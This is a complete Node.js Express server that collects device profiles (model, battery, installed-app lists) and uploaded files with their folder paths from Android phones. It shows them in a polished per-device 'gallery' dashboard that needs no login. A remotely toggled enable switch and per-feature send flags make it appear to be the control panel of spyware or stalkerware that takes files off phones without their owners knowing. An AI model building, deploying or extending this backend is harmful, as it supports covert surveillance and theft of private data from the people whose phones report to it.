const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();

/* ================= CONFIG =================== */

const LOG_FILE = "logs.json";
const CONFIG_FILE = "config.json";

const UPLOAD_DIR = path.join(__dirname, "uploads");
const THUMB_DIR = path.join(__dirname, "thumbs");

if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR);
if (!fs.existsSync(THUMB_DIR)) fs.mkdirSync(THUMB_DIR);

/* ================= HELPERS ================= */

function getIP(req) {
  return (
    (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
    req.socket.remoteAddress ||
    "unknown"
  );
}

function loadConfig() {
  try {
    return JSON.parse(fs.readFileSync(CONFIG_FILE, "utf-8"));
  } catch {
    return { enabled: false };
  }
}

function isAllowed(req, type) {
  const cfg = loadConfig();
  const ip = getIP(req);
  const model = req.query.model || "";

  if (!cfg.enabled) return false;
  if (type === "track" && !cfg.send_device_info) return false;
  if (type === "upload" && !cfg.send_files) return false;
  if (cfg.blocked_ips?.includes(ip)) return false;
  if (cfg.blocked_models?.includes(model)) return false;

  return true;
}

function saveLog(data) {
  try {
    fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
  } catch {}
}

function parseBody(body) {
  const params = new URLSearchParams(body);
  const obj = {};
  for (const [key, value] of params.entries()) {
    obj[key] = value;
  }
  return obj;
}

function readLogs() {
  if (!fs.existsSync(LOG_FILE)) return [];

  return fs
    .readFileSync(LOG_FILE, "utf-8")
    .split("\n")
    .filter(Boolean)
    .map((line) => {
      try {
        return JSON.parse(line);
      } catch {
        return null;
      }
    })
    .filter(Boolean);
}

function escapeHtml(value) {
  return String(value ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function slugify(value) {
  return (
    String(value || "unknown")
      .toLowerCase()
      .replace(/[^a-z0-9]+/g, "-")
      .replace(/^-+|-+$/g, "") || "unknown"
  );
}

function createDeviceId(ip, brand, model) {
  return [ip || "unknown", brand || "unknown", model || "unknown"].join("|");
}

function createDeviceLabel(device) {
  const brandModel = [device.brand, device.model].filter(Boolean).join(" ");
  return brandModel || device.model || device.brand || device.ip || "Unknown Device";
}

function formatDate(dateValue) {
  if (!dateValue) return "-";
  const date = new Date(dateValue);
  if (Number.isNaN(date.getTime())) return "-";
  return date.toLocaleString("en-IN", {
    dateStyle: "medium",
    timeStyle: "short",
  });
}

function formatSize(bytes) {
  const num = Number(bytes);
  if (!Number.isFinite(num) || num < 1) return "-";
  const units = ["B", "KB", "MB", "GB"];
  let size = num;
  let unitIndex = 0;
  while (size >= 1024 && unitIndex < units.length - 1) {
    size /= 1024;
    unitIndex += 1;
  }
  return `${size.toFixed(size >= 10 || unitIndex === 0 ? 0 : 1)} ${units[unitIndex]}`;
}

function getFileType(fileName) {
  const ext = path.extname(fileName || "").toLowerCase();
  if ([".jpg", ".jpeg", ".png", ".gif", ".webp"].includes(ext)) return "image";
  if ([".mp4", ".webm", ".mov", ".mkv"].includes(ext)) return "video";
  if ([".mp3", ".wav", ".aac", ".m4a"].includes(ext)) return "audio";
  if ([".pdf"].includes(ext)) return "document";
  if ([".zip", ".rar", ".7z"].includes(ext)) return "archive";
  return "file";
}

function getFileIcon(type) {
  const icons = {
    image: "IMG",
    video: "VID",
    audio: "AUD",
    document: "DOC",
    archive: "ZIP",
    file: "FILE",
  };
  return icons[type] || "FILE";
}

function getLatestDeviceForIP(ip, logs) {
  const devices = logs
    .filter((entry) => entry.type === "device" && entry.ip === ip)
    .sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0));

  return devices[0] || null;
}

function buildGalleryData(logs) {
  const deviceMap = new Map();
  const files = logs.filter((entry) => entry.type === "file");
  const deviceLogs = logs.filter((entry) => entry.type === "device");

  deviceLogs.forEach((device) => {
    const deviceId = device.device_id || createDeviceId(device.ip, device.brand, device.model);
    if (!deviceMap.has(deviceId)) {
      deviceMap.set(deviceId, {
        id: deviceId,
        ip: device.ip || "unknown",
        brand: device.brand || "",
        model: device.model || "",
        android: device.android || "",
        battery: device.battery || "",
        lastSeen: device.time,
        label: createDeviceLabel(device),
        folders: new Map(),
        files: [],
      });
    } else {
      const current = deviceMap.get(deviceId);
      if (new Date(device.time || 0) > new Date(current.lastSeen || 0)) {
        current.lastSeen = device.time;
        current.battery = device.battery || current.battery;
        current.android = device.android || current.android;
      }
    }
  });

  files.forEach((file) => {
    const inferred =
      file.device_id ||
      createDeviceId(file.ip, file.device_brand, file.device_model);

    let device = deviceMap.get(inferred);

    if (!device) {
      const recent = getLatestDeviceForIP(file.ip, logs);
      const recentId = recent
        ? recent.device_id || createDeviceId(recent.ip, recent.brand, recent.model)
        : null;
      if (recentId && deviceMap.has(recentId)) {
        device = deviceMap.get(recentId);
      }
    }

    if (!device) {
      const fallbackId = inferred || `unknown|${file.ip || "na"}|unknown`;
      device = {
        id: fallbackId,
        ip: file.ip || "unknown",
        brand: file.device_brand || "",
        model: file.device_model || "",
        android: "",
        battery: "",
        lastSeen: file.time,
        label: createDeviceLabel({
          ip: file.ip || "unknown",
          brand: file.device_brand || "",
          model: file.device_model || "",
        }),
        folders: new Map(),
        files: [],
      };
      deviceMap.set(fallbackId, device);
    }

    const folderKey = file.folder || "unknown";
    if (!device.folders.has(folderKey)) {
      device.folders.set(folderKey, []);
    }

    const item = {
      ...file,
      typeLabel: getFileType(file.original || file.file),
      icon: getFileIcon(getFileType(file.original || file.file)),
      fullUrl: `/uploads/${encodeURIComponent(file.file)}`,
      thumbUrl: `/thumbs/${encodeURIComponent(file.thumb || file.file)}`,
    };

    device.files.push(item);
    device.folders.get(folderKey).push(item);
    if (!device.lastSeen || new Date(file.time || 0) > new Date(device.lastSeen || 0)) {
      device.lastSeen = file.time;
    }
  });

  return Array.from(deviceMap.values())
    .map((device) => ({
      ...device,
      folders: Array.from(device.folders.entries())
        .map(([name, items]) => ({
          name,
          slug: slugify(`${device.id}-${name}`),
          items: items.sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0)),
        }))
        .sort((a, b) => a.name.localeCompare(b.name)),
      files: device.files.sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0)),
    }))
    .sort((a, b) => new Date(b.lastSeen || 0) - new Date(a.lastSeen || 0));
}

function renderUsersPage(logs) {
  const devices = logs.filter((entry) => entry.type === "device");
  const unique = {};

  devices.forEach((device) => {
    if (!device.ip || !device.model) return;
    unique[`${device.ip}_${device.model}`] = device;
  });

  const list = Object.values(unique).reverse();

  let html = '<html><body style="background:#111;color:#fff;font-family:sans-serif">';

  list.forEach((device) => {
    const apps = device.user_apps || device.apps || [];
    const system = device.system_apps || [];

    html += `
    <div style="border:1px solid #333;padding:10px;margin:10px">
      <b>${escapeHtml(device.brand || "")} ${escapeHtml(device.model || "")}</b><br>
      IP: ${escapeHtml(device.ip || "")}<br>
      Battery: ${escapeHtml(device.battery || "")}<br>
      Apps: ${escapeHtml(device.app_count || apps.length)}<br>

      <h4>Apps</h4>
      ${apps.map((appName) => `<div>${escapeHtml(appName)}</div>`).join("")}

      ${
        system.length
          ? `<h4>System Apps</h4>${system
              .map((appName) => `<div>${escapeHtml(appName)}</div>`)
              .join("")}`
          : ""
      }
    </div>
    `;
  });

  html += "</body></html>";
  return html;
}

function renderGalleryPage(devices) {
  const totalFiles = devices.reduce((sum, device) => sum + device.files.length, 0);
  const totalFolders = devices.reduce((sum, device) => sum + device.folders.length, 0);
  const totalImages = devices.reduce(
    (sum, device) => sum + device.files.filter((file) => file.typeLabel === "image").length,
    0
  );

  const sidebarDevices = devices
    .map(
      (device, index) => `
      <button class="nav-device ${index === 0 ? "active" : ""}" data-device="${escapeHtml(device.id)}">
        <span class="device-dot"></span>
        <span>
          <strong>${escapeHtml(device.label)}</strong>
          <small>${escapeHtml(device.ip)} • ${device.files.length} files</small>
        </span>
      </button>
    `
    )
    .join("");

  const panels = devices
    .map((device, index) => {
      const folderLinks = device.folders
        .map(
          (folder) => `
          <a href="#${folder.slug}" class="folder-link">
            <span>${escapeHtml(folder.name)}</span>
            <small>${folder.items.length}</small>
          </a>
        `
        )
        .join("");

      const folderSections = device.folders
        .map((folder) => {
          const cards = folder.items
            .map((file) => {
              const isImage = file.typeLabel === "image";
              const isVideo = file.typeLabel === "video";
              const preview = isImage
                ? `<img src="${file.thumbUrl}" alt="${escapeHtml(file.original)}" loading="lazy">`
                : isVideo
                ? `<video muted preload="metadata"><source src="${file.fullUrl}"></video>`
                : `<div class="file-icon">${escapeHtml(file.icon)}</div>`;

              return `
              <article class="file-card" data-search="${escapeHtml(
                `${device.label} ${folder.name} ${file.original} ${file.typeLabel}`
              )}">
                <button
                  class="file-preview-trigger"
                  data-name="${escapeHtml(file.original)}"
                  data-device="${escapeHtml(device.label)}"
                  data-folder="${escapeHtml(folder.name)}"
                  data-type="${escapeHtml(file.typeLabel)}"
                  data-time="${escapeHtml(formatDate(file.time))}"
                  data-size="${escapeHtml(formatSize(file.size))}"
                  data-url="${escapeHtml(file.fullUrl)}"
                  data-thumb="${escapeHtml(isImage ? file.fullUrl : file.thumbUrl)}"
                >
                  <div class="file-thumb">${preview}</div>
                  <div class="file-meta">
                    <strong>${escapeHtml(file.original)}</strong>
                    <span>${escapeHtml(file.typeLabel.toUpperCase())}</span>
                    <small>${escapeHtml(formatDate(file.time))}</small>
                  </div>
                </button>
                <div class="file-actions">
                  <a href="${file.fullUrl}" target="_blank" rel="noreferrer">Open</a>
                  <a href="${file.fullUrl}" download>Download</a>
                </div>
              </article>
            `;
            })
            .join("");

          const rows = folder.items
            .map(
              (file) => `
              <tr class="file-row" data-search="${escapeHtml(
                `${device.label} ${folder.name} ${file.original} ${file.typeLabel}`
              )}">
                <td>${escapeHtml(file.icon)}</td>
                <td>${escapeHtml(file.original)}</td>
                <td>${escapeHtml(file.typeLabel)}</td>
                <td>${escapeHtml(formatDate(file.time))}</td>
                <td>${escapeHtml(formatSize(file.size))}</td>
                <td class="table-actions">
                  <a href="${file.fullUrl}" target="_blank" rel="noreferrer">Open</a>
                  <a href="${file.fullUrl}" download>Download</a>
                </td>
              </tr>
            `
            )
            .join("");

          return `
          <section id="${folder.slug}" class="folder-section">
            <div class="folder-header">
              <div>
                <h3>${escapeHtml(folder.name)}</h3>
                <p>${folder.items.length} items</p>
              </div>
            </div>

            <div class="file-grid">${cards}</div>

            <div class="file-table-wrap">
              <table class="file-table">
                <thead>
                  <tr>
                    <th>Kind</th>
                    <th>Name</th>
                    <th>Type</th>
                    <th>Modified</th>
                    <th>Size</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody>${rows}</tbody>
              </table>
            </div>
          </section>
        `;
        })
        .join("");

      return `
      <section class="device-panel ${index === 0 ? "active" : ""}" data-device-panel="${escapeHtml(
        device.id
      )}">
        <div class="panel-top">
          <div>
            <p class="eyebrow">Device Workspace</p>
            <h2>${escapeHtml(device.label)}</h2>
            <p class="device-details">
              IP ${escapeHtml(device.ip)} • Android ${escapeHtml(device.android || "-")} •
              Battery ${escapeHtml(device.battery || "-")} • Last seen ${escapeHtml(
        formatDate(device.lastSeen)
      )}
            </p>
          </div>
          <div class="device-stats">
            <div><strong>${device.files.length}</strong><span>Files</span></div>
            <div><strong>${device.folders.length}</strong><span>Folders</span></div>
          </div>
        </div>

        <div class="panel-controls">
          <div class="folder-links">${folderLinks || '<span class="empty-inline">No folders</span>'}</div>
        </div>

        ${folderSections || '<div class="empty-state">No files received for this device yet.</div>'}
      </section>
    `;
    })
    .join("");

  return `
  <!DOCTYPE html>
  <html>
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Device Gallery</title>
      <style>
        :root {
          --bg: #0a0f17;
          --panel: rgba(14, 23, 38, 0.92);
          --panel-2: rgba(20, 32, 52, 0.9);
          --line: rgba(151, 173, 204, 0.18);
          --text: #edf4ff;
          --muted: #8fa4c7;
          --accent: #43c59e;
          --accent-2: #59a8ff;
          --shadow: 0 20px 60px rgba(0, 0, 0, 0.35);
        }

        * {
          box-sizing: border-box;
        }

        html {
          scroll-behavior: smooth;
        }

        body {
          margin: 0;
          font-family: "Segoe UI", sans-serif;
          color: var(--text);
          background:
            radial-gradient(circle at top left, rgba(67, 197, 158, 0.15), transparent 24%),
            radial-gradient(circle at top right, rgba(89, 168, 255, 0.18), transparent 26%),
            linear-gradient(180deg, #07101a 0%, #091420 100%);
          min-height: 100vh;
        }

        .app-shell {
          display: grid;
          grid-template-columns: 280px minmax(0, 1fr) 340px;
          min-height: 100vh;
        }

        .sidebar,
        .preview {
          background: var(--panel);
          backdrop-filter: blur(16px);
          border-right: 1px solid var(--line);
        }

        .preview {
          border-right: none;
          border-left: 1px solid var(--line);
          padding: 24px;
          position: sticky;
          top: 0;
          height: 100vh;
        }

        .sidebar {
          padding: 24px 18px;
          position: sticky;
          top: 0;
          height: 100vh;
          overflow: auto;
        }

        .main {
          padding: 24px;
        }

        .brand {
          margin-bottom: 22px;
        }

        .brand h1 {
          margin: 0 0 8px;
          font-size: 24px;
        }

        .brand p,
        .eyebrow,
        .device-details,
        .folder-header p,
        .file-meta span,
        .file-meta small,
        .nav-device small,
        .preview small,
        .empty-inline {
          color: var(--muted);
        }

        .stats-bar {
          display: grid;
          grid-template-columns: repeat(4, minmax(0, 1fr));
          gap: 16px;
          margin-bottom: 20px;
        }

        .stat-card {
          background: var(--panel);
          border: 1px solid var(--line);
          border-radius: 18px;
          padding: 18px;
          box-shadow: var(--shadow);
        }

        .stat-card strong {
          display: block;
          font-size: 28px;
          margin-bottom: 6px;
        }

        .toolbar {
          display: flex;
          gap: 12px;
          align-items: center;
          justify-content: space-between;
          margin-bottom: 24px;
          flex-wrap: wrap;
          background: var(--panel);
          border: 1px solid var(--line);
          border-radius: 18px;
          padding: 14px;
        }

        .toolbar input {
          min-width: 260px;
          background: rgba(255, 255, 255, 0.04);
          border: 1px solid var(--line);
          border-radius: 12px;
          color: var(--text);
          padding: 12px 14px;
          outline: none;
        }

        .view-toggle {
          display: flex;
          gap: 8px;
        }

        .view-toggle button,
        .nav-device,
        .file-preview-trigger {
          border: none;
          background: transparent;
          color: inherit;
          font: inherit;
          cursor: pointer;
        }

        .view-toggle button {
          padding: 10px 14px;
          border-radius: 12px;
          background: rgba(255, 255, 255, 0.04);
          border: 1px solid var(--line);
        }

        .view-toggle button.active {
          background: rgba(67, 197, 158, 0.12);
          border-color: rgba(67, 197, 158, 0.4);
          color: var(--accent);
        }

        .nav-device {
          width: 100%;
          text-align: left;
          display: flex;
          gap: 12px;
          align-items: flex-start;
          padding: 14px;
          border-radius: 16px;
          margin-bottom: 10px;
          background: rgba(255, 255, 255, 0.03);
          border: 1px solid transparent;
        }

        .nav-device.active {
          background: rgba(89, 168, 255, 0.12);
          border-color: rgba(89, 168, 255, 0.35);
        }

        .device-dot {
          width: 10px;
          height: 10px;
          border-radius: 999px;
          margin-top: 6px;
          background: linear-gradient(180deg, var(--accent), var(--accent-2));
          flex: none;
        }

        .device-panel {
          display: none;
        }

        .device-panel.active {
          display: block;
        }

        .panel-top {
          display: flex;
          justify-content: space-between;
          gap: 24px;
          align-items: flex-start;
          margin-bottom: 20px;
        }

        .panel-top h2 {
          margin: 4px 0 8px;
          font-size: 34px;
        }

        .device-stats {
          display: grid;
          grid-template-columns: repeat(2, minmax(0, 1fr));
          gap: 12px;
          min-width: 170px;
        }

        .device-stats div {
          background: var(--panel-2);
          border: 1px solid var(--line);
          border-radius: 16px;
          padding: 14px;
        }

        .device-stats strong {
          display: block;
          font-size: 22px;
        }

        .panel-controls {
          margin-bottom: 20px;
        }

        .folder-links {
          display: flex;
          flex-wrap: wrap;
          gap: 10px;
        }

        .folder-link {
          display: inline-flex;
          gap: 10px;
          align-items: center;
          padding: 10px 14px;
          text-decoration: none;
          color: var(--text);
          background: rgba(255, 255, 255, 0.04);
          border: 1px solid var(--line);
          border-radius: 999px;
        }

        .folder-section {
          margin-bottom: 28px;
          background: rgba(8, 15, 24, 0.62);
          border: 1px solid var(--line);
          border-radius: 22px;
          padding: 18px;
          box-shadow: var(--shadow);
        }

        .folder-header {
          margin-bottom: 16px;
        }

        .folder-header h3 {
          margin: 0 0 4px;
          font-size: 22px;
        }

        .file-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
          gap: 16px;
        }

        .file-card {
          background: rgba(255, 255, 255, 0.03);
          border: 1px solid var(--line);
          border-radius: 18px;
          overflow: hidden;
          display: flex;
          flex-direction: column;
        }

        .file-preview-trigger {
          padding: 0;
          text-align: left;
        }

        .file-thumb {
          aspect-ratio: 4 / 3;
          background: linear-gradient(135deg, rgba(89, 168, 255, 0.14), rgba(67, 197, 158, 0.12));
          display: flex;
          align-items: center;
          justify-content: center;
          overflow: hidden;
        }

        .file-thumb img,
        .file-thumb video {
          width: 100%;
          height: 100%;
          object-fit: cover;
          display: block;
        }

        .file-icon {
          width: 72px;
          height: 72px;
          border-radius: 18px;
          background: rgba(255, 255, 255, 0.06);
          display: grid;
          place-items: center;
          font-weight: 700;
        }

        .file-meta {
          padding: 14px;
          display: grid;
          gap: 6px;
        }

        .file-actions,
        .table-actions {
          display: flex;
          gap: 12px;
          padding: 0 14px 14px;
        }

        .file-actions a,
        .table-actions a {
          color: var(--accent-2);
          text-decoration: none;
        }

        .file-table-wrap {
          display: none;
          margin-top: 14px;
          overflow-x: auto;
        }

        .list-view .file-grid {
          display: none;
        }

        .list-view .file-table-wrap {
          display: block;
        }

        .file-table {
          width: 100%;
          border-collapse: collapse;
        }

        .file-table th,
        .file-table td {
          padding: 12px 10px;
          border-bottom: 1px solid var(--line);
          text-align: left;
        }

        .preview-card {
          background: rgba(255, 255, 255, 0.03);
          border: 1px solid var(--line);
          border-radius: 24px;
          overflow: hidden;
        }

        .preview-media {
          aspect-ratio: 4 / 3;
          background: rgba(255, 255, 255, 0.03);
          display: flex;
          align-items: center;
          justify-content: center;
          overflow: hidden;
        }

        .preview-media img,
        .preview-media video {
          width: 100%;
          height: 100%;
          object-fit: cover;
        }

        .preview-info {
          padding: 18px;
          display: grid;
          gap: 10px;
        }

        .preview-meta {
          display: grid;
          gap: 8px;
        }

        .preview-actions {
          display: flex;
          gap: 12px;
          margin-top: 8px;
        }

        .preview-actions a {
          flex: 1;
          text-align: center;
          text-decoration: none;
          padding: 12px;
          border-radius: 12px;
          color: var(--text);
          background: rgba(255, 255, 255, 0.05);
          border: 1px solid var(--line);
        }

        .preview-actions a.primary {
          background: linear-gradient(135deg, rgba(67, 197, 158, 0.18), rgba(89, 168, 255, 0.18));
          border-color: rgba(89, 168, 255, 0.35);
        }

        .empty-state {
          padding: 32px;
          border-radius: 18px;
          border: 1px dashed var(--line);
          text-align: center;
          color: var(--muted);
          background: rgba(255, 255, 255, 0.03);
        }

        .hidden-by-search {
          display: none !important;
        }

        @media (max-width: 1200px) {
          .app-shell {
            grid-template-columns: 240px minmax(0, 1fr);
          }

          .preview {
            display: none;
          }
        }

        @media (max-width: 820px) {
          .app-shell {
            grid-template-columns: 1fr;
          }

          .sidebar {
            position: static;
            height: auto;
            border-right: none;
            border-bottom: 1px solid var(--line);
          }

          .stats-bar {
            grid-template-columns: repeat(2, minmax(0, 1fr));
          }

          .panel-top {
            flex-direction: column;
          }
        }
      </style>
    </head>
    <body>
      <div class="app-shell">
        <aside class="sidebar">
          <div class="brand">
            <p class="eyebrow">Advanced File Manager</p>
            <h1>Smart Device Gallery</h1>
            <p>${devices.length} devices connected</p>
          </div>
          <div class="device-nav">
            ${sidebarDevices || '<div class="empty-state">No devices available</div>'}
          </div>
        </aside>

        <main class="main" id="galleryRoot">
          <section class="stats-bar">
            <div class="stat-card"><strong>${devices.length}</strong><span>Devices</span></div>
            <div class="stat-card"><strong>${totalFolders}</strong><span>Folders</span></div>
            <div class="stat-card"><strong>${totalFiles}</strong><span>Total Files</span></div>
            <div class="stat-card"><strong>${totalImages}</strong><span>Images</span></div>
          </section>

          <section class="toolbar">
            <input id="searchInput" type="search" placeholder="Search by file, folder, device...">
            <div class="view-toggle">
              <button class="active" data-view="grid">Grid</button>
              <button data-view="list">List</button>
            </div>
          </section>

          ${panels || '<div class="empty-state">No files received yet.</div>'}
        </main>

        <aside class="preview">
          <p class="eyebrow">Preview Pane</p>
          <div class="preview-card">
            <div class="preview-media" id="previewMedia">
              <div class="file-icon">FILE</div>
            </div>
            <div class="preview-info">
              <div>
                <h3 id="previewName">Select a file</h3>
                <small id="previewType">Choose any card to inspect details</small>
              </div>
              <div class="preview-meta">
                <span id="previewDevice">Device: -</span>
                <span id="previewFolder">Folder: -</span>
                <span id="previewTime">Updated: -</span>
                <span id="previewSize">Size: -</span>
              </div>
              <div class="preview-actions">
                <a id="previewOpen" href="#" target="_blank" rel="noreferrer" class="primary">Open</a>
                <a id="previewDownload" href="#" download>Download</a>
              </div>
            </div>
          </div>
        </aside>
      </div>

      <script>
        const root = document.getElementById("galleryRoot");
        const searchInput = document.getElementById("searchInput");
        const navButtons = document.querySelectorAll(".nav-device");
        const panels = document.querySelectorAll(".device-panel");
        const viewButtons = document.querySelectorAll(".view-toggle button");
        const previewButtons = document.querySelectorAll(".file-preview-trigger");

        const previewMedia = document.getElementById("previewMedia");
        const previewName = document.getElementById("previewName");
        const previewType = document.getElementById("previewType");
        const previewDevice = document.getElementById("previewDevice");
        const previewFolder = document.getElementById("previewFolder");
        const previewTime = document.getElementById("previewTime");
        const previewSize = document.getElementById("previewSize");
        const previewOpen = document.getElementById("previewOpen");
        const previewDownload = document.getElementById("previewDownload");

        function activateDevice(deviceId) {
          navButtons.forEach((button) => {
            button.classList.toggle("active", button.dataset.device === deviceId);
          });

          panels.forEach((panel) => {
            panel.classList.toggle("active", panel.dataset.devicePanel === deviceId);
          });
        }

        navButtons.forEach((button) => {
          button.addEventListener("click", () => activateDevice(button.dataset.device));
        });

        viewButtons.forEach((button) => {
          button.addEventListener("click", () => {
            viewButtons.forEach((item) => item.classList.toggle("active", item === button));
            root.classList.toggle("list-view", button.dataset.view === "list");
          });
        });

        searchInput.addEventListener("input", () => {
          const query = searchInput.value.trim().toLowerCase();
          document.querySelectorAll(".file-card, .file-row").forEach((item) => {
            const haystack = (item.dataset.search || "").toLowerCase();
            item.classList.toggle("hidden-by-search", query && !haystack.includes(query));
          });
        });

        function setPreview(button) {
          const type = button.dataset.type;
          const url = button.dataset.url;
          const thumb = button.dataset.thumb;

          previewName.textContent = button.dataset.name;
          previewType.textContent = type.toUpperCase();
          previewDevice.textContent = "Device: " + button.dataset.device;
          previewFolder.textContent = "Folder: " + button.dataset.folder;
          previewTime.textContent = "Updated: " + button.dataset.time;
          previewSize.textContent = "Size: " + button.dataset.size;
          previewOpen.href = url;
          previewDownload.href = url;

          if (type === "image") {
            previewMedia.innerHTML = '<img src="' + thumb + '" alt="">';
          } else if (type === "video") {
            previewMedia.innerHTML = '<video controls preload="metadata"><source src="' + url + '"></video>';
          } else {
            previewMedia.innerHTML = '<div class="file-icon">' + type.slice(0, 4).toUpperCase() + "</div>";
          }
        }

        previewButtons.forEach((button) => {
          button.addEventListener("click", () => setPreview(button));
        });

        if (previewButtons[0]) setPreview(previewButtons[0]);
      </script>
    </body>
  </html>
  `;
}

/* ================= CONFIG ================= */

app.get("/config", (req, res) => {
  const cfg = loadConfig();
  res.send(cfg.enabled ? "1" : "0");
});

/* ================= TRACK ================= */

app.post("/track", (req, res) => {
  if (!isAllowed(req, "track")) {
    return res.json({ status: "blocked" });
  }

  let body = "";
  req.on("data", (chunk) => {
    body += chunk.toString();
  });

  req.on("end", () => {
    const parsed = parseBody(body);
    const allApps = parsed.apps
      ? parsed.apps.split(",").map((appName) => appName.trim()).filter(Boolean)
      : [];

    const systemApps = allApps.filter(
      (appName) =>
        appName.startsWith("android") ||
        appName.startsWith("com.android") ||
        appName.startsWith("com.google")
    );

    const userApps = allApps.filter((appName) => !systemApps.includes(appName));
    const ip = getIP(req);
    const deviceId = createDeviceId(ip, parsed.brand, parsed.model);

    const data = {
      type: "device",
      ip,
      device_id: deviceId,
      battery: parsed.battery,
      model: parsed.model,
      brand: parsed.brand,
      android: parsed.android,
      app_count: allApps.length,
      system_apps: systemApps,
      user_apps: userApps,
      time: new Date().toISOString(),
    };

    saveLog(data);
    res.json({ status: "ok", device_id: deviceId });
  });
});

/* ================= UPLOAD ================= */

app.post("/upload", (req, res) => {
  if (!isAllowed(req, "upload")) {
    return res.status(403).send("blocked");
  }

  let fileName = "file.bin";
  let folder = "unknown";

  if (req.query.name) {
    try {
      const decoded = decodeURIComponent(req.query.name);
      folder = path.dirname(decoded);
      fileName = path.basename(decoded);
    } catch {}
  }

  const ip = getIP(req);
  const logs = readLogs();
  const latestDevice = getLatestDeviceForIP(ip, logs);
  const deviceBrand = req.query.brand || latestDevice?.brand || "";
  const deviceModel = req.query.model || latestDevice?.model || "";
  const deviceId =
    req.query.device_id || createDeviceId(ip, deviceBrand, deviceModel);

  const safeName = `${Date.now()}_${fileName}`;
  const filePath = path.join(UPLOAD_DIR, safeName);

  const thumbName = `thumb_${safeName}`;
  const thumbPath = path.join(THUMB_DIR, thumbName);

  const stream = fs.createWriteStream(filePath);
  req.pipe(stream);

  stream.on("finish", () => {
    let size = 0;
    try {
      size = fs.statSync(filePath).size;
    } catch {}

    fs.copyFile(filePath, thumbPath, () => {});

    saveLog({
      type: "file",
      file: safeName,
      original: fileName,
      folder,
      thumb: thumbName,
      ip,
      device_id: deviceId,
      device_brand: deviceBrand,
      device_model: deviceModel,
      size,
      time: new Date().toISOString(),
    });

    res.json({ status: "uploaded", file: safeName, device_id: deviceId });
  });

  stream.on("error", () => {
    res.status(500).send("error");
  });

  req.on("error", () => {
    res.status(500).send("error");
  });
});

/* ================= USERS ================= */

app.get("/users", (req, res) => {
  const logs = readLogs();
  if (!logs.length) return res.send("No data");
  res.send(renderUsersPage(logs));
});

/* ================= GALLERY ================= */

app.get("/gallery", (req, res) => {
  const logs = readLogs();
  if (!logs.length) return res.send("No data");

  const devices = buildGalleryData(logs).filter((device) => device.files.length);
  res.send(renderGalleryPage(devices));
});

/* ================= STATIC ================= */

app.use("/uploads", express.static(UPLOAD_DIR));
app.use("/thumbs", express.static(THUMB_DIR));

/* ================= START ================= */

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
